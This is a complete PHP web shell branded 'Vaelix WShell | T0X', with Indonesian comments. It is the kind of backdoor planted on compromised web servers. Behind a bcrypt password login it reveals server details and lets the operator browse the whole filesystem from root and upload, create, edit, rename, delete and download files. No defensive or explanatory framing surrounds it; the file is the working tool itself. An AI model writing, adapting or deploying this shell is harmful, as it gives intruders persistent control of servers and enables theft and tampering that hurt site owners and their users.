<?php
session_start();
date_default_timezone_set("Europe/Moscow");

$hashed_password = '$2y$10$.Vnz6zvukcncXLOsyRUWQuDnRJHLJfAQqNI6kdCDLBJaxQomaRQkS'; // pakai bycrpt // ngetod
$root_dir = '/';

// --- LOGIN ---
if (!isset($_SESSION['logged'])) {
    if (isset($_POST['password']) && password_verify($_POST['password'], $hashed_password)) {
        $_SESSION['logged'] = true;
        header("Location: ?");
        exit;
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <title>Vaelix WShell | T0X</title>
        <style>
            body { background:#fff; color:#222; font-family:monospace; }
            input[type=password], button { border:1px solid #ccc; padding:7px; font-size:16px; }
            form { margin:100px auto; width:320px; background:#fff; border-radius:7px; box-shadow:0 2px 10px #eee; padding:30px;}
        </style>
    </head>
    <body>
        <form method="post">
            <h3 style="text-align:center;">Vaelix WShell | T0X</h3>
            <input type="password" name="password" placeholder="Password" required autofocus style="width:100%;margin-bottom:10px;">
            <button type="submit" style="width:100%">Login</button>
        </form>
    </body>
    </html>
    <?php exit;
}

// --- PATH ---
$path = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$path = realpath($path);
if (!$path || strpos($path, $root_dir) !== 0) $path = $root_dir;
chdir($path);

// --- SERVER INFO ---
$server_ip = gethostbyname(gethostname());
$server_hostname = gethostname();
$php_uname = php_uname();
$php_version = phpversion();

// --- HELPERS ---
function perms($file) {
    $p = @fileperms($file);
    if ($p === false) return '---------';
    $t = is_dir($file) ? 'd' : '-';
    $str = $t;
    $str .= ($p & 0x0100) ? 'r' : '-';
    $str .= ($p & 0x0080) ? 'w' : '-';
    $str .= ($p & 0x0040) ? 'x' : '-';
    $str .= ($p & 0x0020) ? 'r' : '-';
    $str .= ($p & 0x0010) ? 'w' : '-';
    $str .= ($p & 0x0008) ? 'x' : '-';
    $str .= ($p & 0x0004) ? 'r' : '-';
    $str .= ($p & 0x0002) ? 'w' : '-';
    $str .= ($p & 0x0001) ? 'x' : '-';
    return $str;
}
function filesize_h($file) {
    if (!is_file($file)) return '-';
    $size = filesize($file);
    $units = ['B','KB','MB','GB','TB'];
    $i = 0;
    while ($size >= 1024 && $i < 4) { $size /= 1024; $i++; }
    return round($size,2).' '.$units[$i];
}

// --- ACTIONS ---
$msg = '';
// CREATE FOLDER
if (isset($_POST['create_folder'])) {
    $name = basename($_POST['create_folder']);
    if ($name && @mkdir($path . '/' . $name)) $msg = "Folder created!";
    else $msg = "Failed to create folder!";
}
// CREATE FILE
if (isset($_POST['create_file'])) {
    $name = basename($_POST['create_file']);
    if ($name && @file_put_contents($path . '/' . $name, $_POST['file_content'])) $msg = "File created!";
    else $msg = "Failed to create file!";
}
// RENAME
if (isset($_POST['rename']) && isset($_GET['item'])) {
    $newname = basename($_POST['rename']);
    $old = $path . '/' . $_GET['item'];
    $new = $path . '/' . $newname;
    if (@rename($old, $new)) $msg = "Renamed!";
    else $msg = "Rename failed!";
    unset($_GET['rename'], $_GET['item']);
    header("Location: ?dir=" . urlencode($path));
    exit;
}
// EDIT
if (isset($_POST['edit']) && isset($_GET['item'])) {
    $file = $path . '/' . $_GET['item'];
    if (@file_put_contents($file, $_POST['edit'])) $msg = "File edited!";
    else $msg = "Edit failed!";
    unset($_GET['edit'], $_GET['item']);
    header("Location: ?dir=" . urlencode($path));
    exit;
}
// DELETE
if (isset($_GET['delete'])) {
    $target = $path . '/' . $_GET['delete'];
    if (is_file($target)) { @unlink($target); $msg = "File deleted!"; }
    elseif (is_dir($target)) { @rmdir($target); $msg = "Folder deleted!"; }
    unset($_GET['delete']);
    header("Location: ?dir=" . urlencode($path));
    exit;
}
// DOWNLOAD
if (isset($_GET['download'])) {
    $file = $path . '/' . $_GET['download'];
    if (is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Content-Length: ' . filesize($file));
        readfile($file); exit;
    }
}

// --- DIR LIST ---
$files = @scandir($path);
$dirs = [];
$only_files = [];
if ($files) {
    foreach ($files as $item) {
        if ($item == '.') continue;
        $full = $path . '/' . $item;
        if (is_dir($full)) $dirs[] = $item;
        elseif (is_file($full)) $only_files[] = $item;
    }
    sort($dirs, SORT_NATURAL | SORT_FLAG_CASE);
    sort($only_files, SORT_NATURAL | SORT_FLAG_CASE);
}

// --- HTML ---
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Vaelix WShell | T0X</title>
    <style>
        body { background:#fff; color:#222; font-family:monospace; padding:0; margin:0;}
        .container { max-width:900px; margin:auto; padding:24px;}
        table { background:#fff; width:100%; margin-bottom:24px; border-collapse:collapse; }
        th, td { padding:8px 14px; border-bottom:1px solid #eee; font-size:16px;}
        th { width:30%; background:#f4f4f4; text-align:left;}
        .breadcrumb { background:#f9f9f9; padding:7px 12px; border-radius:6px; font-size:16px; margin-bottom:24px;}
        .breadcrumb a { color:#1976d2; text-decoration:none; }
        .breadcrumb a:hover { text-decoration:underline; }
        .btn { display:inline-block; padding:4px 12px; font-size:15px; border:1px solid #ccc; background:#fff; color:#222; border-radius:4px; cursor:pointer; }
        .btn:hover { background:#f4f4f4; }
        .alert { background:#f9f9f9; color:#333; border-left:4px solid #1976d2; padding:10px; margin-bottom:12px;}
        input, textarea { border:1px solid #ccc; padding:6px; font-family:monospace; width:100%; margin-bottom:7px; border-radius:3px;}
        .table-sm td, .table-sm th { font-size:14px; padding:5px 8px;}
        .card { background:#f5f5f5; border-radius:7px; margin-bottom:20px; padding:18px; }
        .card h5 { margin-top:0; font-size:17px; }
    </style>
</head>
<body>
<div class="container">

    <?php
    // EDIT FILE
    if (isset($_GET['edit']) && isset($_GET['item'])) {
        $file = $path . '/' . $_GET['item'];
        if (is_file($file)) {
            echo '<div class="card">
                <h5>Edit: ' . htmlspecialchars($_GET['item']) . '</h5>
                <form method="post">
                    <textarea name="edit" rows="12">' . htmlspecialchars(file_get_contents($file)) . '</textarea>
                    <button class="btn" type="submit">Save</button>
                </form>
            </div>';
        }
    }
    // RENAME
    if (isset($_GET['rename']) && isset($_GET['item'])) {
        echo '<div class="card">
            <h5>Rename: ' . htmlspecialchars($_GET['item']) . '</h5>
            <form method="post">
                <input type="text" name="rename" value="' . htmlspecialchars($_GET['item']) . '" required>
                <button class="btn" type="submit">Rename</button>
            </form>
        </div>';
    }
    ?>

    <!-- Table 1: Informasi Server -->
    <table>
        <tr><th>Server IP</th><td><?= htmlspecialchars($server_ip) ?> &nbsp; <small>(<?= htmlspecialchars($server_hostname) ?>)</small></td></tr>
        <tr><th>PHP Uname</th><td><?= htmlspecialchars($php_uname) ?></td></tr>
        <tr><th>Versi PHP</th><td><?= htmlspecialchars($php_version) ?></td></tr>
    </table>

    <!-- Table 2: Lokasi Root Directory -->
    <table>
        <tr>
            <th>Lokasi</th>
            <td>
                <div class="breadcrumb">
                    <?php
                    $parts = explode('/', trim($path, '/'));
                    $build = '';
                    echo '<a href="?dir=/">/</a>';
                    foreach ($parts as $i => $p) {
                        if ($p === '') continue;
                        $build .= '/' . $p;
                        echo ' / <a href="?dir=' . urlencode($build) . '">' . htmlspecialchars($p) . '</a>';
                    }
                    ?>
                </div>
            </td>
        </tr>
    </table>

    <?php if ($msg): ?>
        <div class="alert"><?= $msg ?></div>
    <?php endif; ?>

    <!-- Create actions -->
    <form method="post" class="d-inline" style="margin-bottom:7px;">
        <input type="text" name="create_folder" placeholder="Folder name" required style="width:140px;display:inline-block;">
        <button class="btn" type="submit">+Folder</button>
    </form>
    <button class="btn" onclick="document.getElementById('createFileBox').style.display='block'">+File</button>
    <form method="post" id="createFileBox" style="display:none;margin-top:7px;">
        <input type="text" name="create_file" placeholder="File name" required>
        <textarea name="file_content" rows="2" placeholder="File content"></textarea>
        <button class="btn" type="submit">Create File</button>
    </form>
    <form method="post" enctype="multipart/form-data" class="d-inline" style="margin-bottom:7px;">
        <input type="file" name="fileup" required style="width:140px;display:inline-block;">
        <button class="btn" type="submit">Upload</button>
    </form>
    <?php
    // Handle upload
    if (isset($_FILES['fileup'])) {
        $f = $_FILES['fileup'];
        if (@move_uploaded_file($f['tmp_name'], $path . '/' . basename($f['name']))) {
            echo '<div class="alert">File uploaded!</div>';
        } else {
            echo '<div class="alert">Upload failed!</div>';
        }
    }
    ?>

    <!-- Directory Table -->
    <table class="table-sm">
        <thead>
            <tr>
                <th>Name</th>
                <th>Type</th>
                <th>Size</th>
                <th>Perms</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
        <?php
        // Parent dir link
        if ($path !== $root_dir) {
            $parent = dirname($path);
            echo '<tr>
                <td><a href="?dir=' . urlencode($parent) . '"><b>&lt; ..</b></a></td>
                <td>DIR</td><td>-</td><td>-</td><td>-</td>
            </tr>';
        }
        foreach ($dirs as $item) {
            $full = $path . '/' . $item;
            echo '<tr><td><a href="?dir=' . urlencode($full) . '"><b>' . htmlspecialchars($item) . '</b></a></td>';
            echo '<td>DIR</td><td>-</td><td>' . perms($full) . '</td><td>';
            echo '<a href="?dir=' . urlencode($path) . '&rename=1&item=' . urlencode($item) . '" class="btn">Rename</a> ';
            echo '<a href="?dir=' . urlencode($path) . '&delete=' . urlencode($item) . '" class="btn" onclick="return confirm(\'Delete?\')">Delete</a>';
            echo '</td></tr>';
        }
        // Lalu file
        foreach ($only_files as $item) {
            $full = $path . '/' . $item;
            echo '<tr><td>' . htmlspecialchars($item) . '</td>';
            echo '<td>FILE</td><td>' . filesize_h($full) . '</td><td>' . perms($full) . '</td><td>';
            echo '<a href="?dir=' . urlencode($path) . '&download=' . urlencode($item) . '" class="btn">Download</a> ';
            echo '<a href="?dir=' . urlencode($path) . '&edit=1&item=' . urlencode($item) . '" class="btn">Edit</a> ';
            echo '<a href="?dir=' . urlencode($path) . '&rename=1&item=' . urlencode($item) . '" class="btn">Rename</a> ';
            echo '<a href="?dir=' . urlencode($path) . '&delete=' . urlencode($item) . '" class="btn" onclick="return confirm(\'Delete?\')">Delete</a>';
            echo '</td></tr>';
        }
        ?>
        </tbody>
    </table>
</div>
<script>
</script>
</body>
</html>
